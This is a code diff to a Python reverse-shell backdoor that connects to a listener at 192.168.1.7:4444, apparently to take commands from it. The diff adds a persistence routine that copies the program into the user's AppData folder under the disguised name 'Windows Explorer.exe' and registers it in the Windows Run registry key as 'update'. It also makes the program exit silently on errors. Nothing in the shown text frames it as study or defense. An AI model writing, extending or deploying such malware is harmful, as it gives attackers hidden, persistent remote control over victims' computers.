@@ -1,11 +1,17 @@
 import socket
-import subprocess,json, os, base64, sys
+import subprocess,json, os, base64, sys, shutil
 
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
         self.connection.send(b"[+] Connection Successful\n\n")
+    
+    def go_persistence(self):
+        persistant_backdoor_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(persistant_backdoor_location):
+            shutil.copyfile(sys.executable, persistant_backdoor_location)
+            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + persistant_backdoor_location + '"')
     
     def safe_send(self, data):
         self.connection.send(json.dump(data).encode())
@@ -56,5 +62,8 @@ class Backdoor:
             
             self.safe_send(command_result)
 
-my_backdoor = Backdoor("192.168.1.7", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("192.168.1.7", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
